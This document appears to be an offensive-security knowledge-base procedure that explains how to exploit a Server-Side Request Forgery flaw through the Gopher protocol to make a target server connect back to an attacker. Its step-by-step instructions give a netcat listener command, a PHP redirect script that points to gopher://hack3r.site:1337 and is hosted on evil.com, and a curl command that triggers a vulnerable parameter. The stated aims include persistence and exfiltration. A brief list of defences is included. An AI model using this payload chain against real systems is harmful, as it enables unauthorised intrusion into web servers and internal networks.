---
id: b12e1c35-d544-44b6-96ee-c9a11bcb7ac6
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:37.948396+00:00'
updated_at: '2023-10-10T20:24:09.768176+00:00'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
techniques:
  - >-
    [[techniques/Exploit Public-Facing Application|T1190 - Exploit Public-Facing
    Application]]
sub_techniques: []
tags:
  - '[[tags/Gopher]]'
  - '[[tags/Server-Side Request Forgery]]'
  - '[[tags/SSRF exploitation via URL Scheme]]'
commands:
  - '[[commands/curl-query-vulnerable-ssrf-endpoint]]'
tools: []
platforms:
  - Web
validated: true
---

# Gopher-Protocol-SSRF-for-SMTP-Back-Connect

## Summary

This procedure exploits a Server-Side Request Forgery (SSRF) vulnerability using the Gopher protocol to force the target server to establish a back-connect to an attacker-controlled server on port 1337 via SMTP. It involves setting up a redirect endpoint on a controlled domain and querying a vulnerable parameter to trigger the SSRF, enabling potential access to internal resources or persistence.

## Description

Server-Side Request Forgery (SSRF) allows attackers to make unauthorized requests from the target server to internal or external resources. This technique leverages the obscure Gopher protocol, which can encapsulate SMTP commands, to initiate a TCP connection back to the attacker's listener on port 1337. The attack starts by hosting a PHP redirect script on a controlled server (e.g., evil.com) that points to a Gopher URL. When the vulnerable application fetches this redirect (e.g., via a URL parameter), it follows the Location header, triggering the SSRF and executing the Gopher payload. This can bypass firewalls, access internal metadata services, or establish a backdoor. The target environment is typically a web application with SSRF in URL fetching or image loading features, running on a server with outbound connectivity.

## Requirements

1. Control over a domain and web server to host the redirect PHP script (e.g., evil.com).
2. Knowledge of the vulnerable SSRF endpoint (e.g., example.com/?q=URL parameter).
3. Attacker machine with netcat or similar listener capability on port 1337.
4. Network access to query the target application.

## Defense

- Implement strict URL validation and whitelisting to block non-HTTP protocols like Gopher.
- Use network segmentation and firewalls to restrict outbound connections from web servers.
- Deploy a Web Application Firewall (WAF) to detect and block SSRF patterns, including redirects to unusual protocols.
- Enable logging of all outbound requests from application servers for monitoring.

## Objectives

1. Trigger SSRF to force a back-connect from the target server to the attacker on port 1337.
2. Bypass network restrictions to access internal resources indirectly.
3. Establish a persistent channel for further exploitation or data exfiltration.

## Instructions

### Step 1: Set Up Attacker Listener

**Context**: Prepare to receive the back-connect by starting a listener on port 1337. This will capture the incoming SMTP connection initiated via the Gopher payload.

Use netcat to listen:

```bash
nc -lvp 1337
```

> This command binds to port 1337 and waits for incoming connections. Expected output includes a message like "Listening on [0.0.0.0] (family 0, port 1337)" upon starting.

### Step 2: Deploy Redirect Payload Code

**Context**: Host the PHP redirect script on your controlled server to craft the Gopher URL. This script will be fetched by the vulnerable application, causing it to redirect and trigger the SSRF.

**Code** ([[codes/PHP-Gopher-SSRF-Redirect]]):

```php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>
```

> Save this as redirect.php on your server (e.g., http://evil.com/redirect.php). The header redirects to the Gopher URL, which encapsulates an SMTP back-connect payload (e.g., _SSRF%0ATest! as a simple test string). When executed via SSRF, it forces the target to connect to hack3r.site:1337. Verify by accessing the URL directly; it should redirect immediately without errors.

### Step 3: Trigger SSRF via Vulnerable Endpoint

**Context**: Query the vulnerable SSRF parameter with the redirect URL to make the target fetch and follow it, initiating the back-connect.

**Command** ([[commands/curl-query-vulnerable-ssrf-endpoint]]):

```bash
curl "https://example.com/?q=http://evil.com/redirect.php"
```

> This sends a GET request to the vulnerable endpoint, passing the redirect URL. If SSRF is present, the target will fetch http://evil.com/redirect.php, follow the Location header, and connect to gopher://hack3r.site:1337. Expected output is the target's response (e.g., 200 OK or redirect status), but monitor your listener for the incoming connection.

### Step 4: Verify Back-Connect

**Context**: Confirm the SSRF success by checking the listener for the incoming connection and any payload data.

Monitor the netcat output for a connection from the target's IP, potentially receiving the SMTP test payload (e.g., "SSRF Test!").

> Success is indicated by a new connection in the listener, confirming the back-connect. If no connection arrives, check for WAF blocks or adjust the Gopher payload encoding.
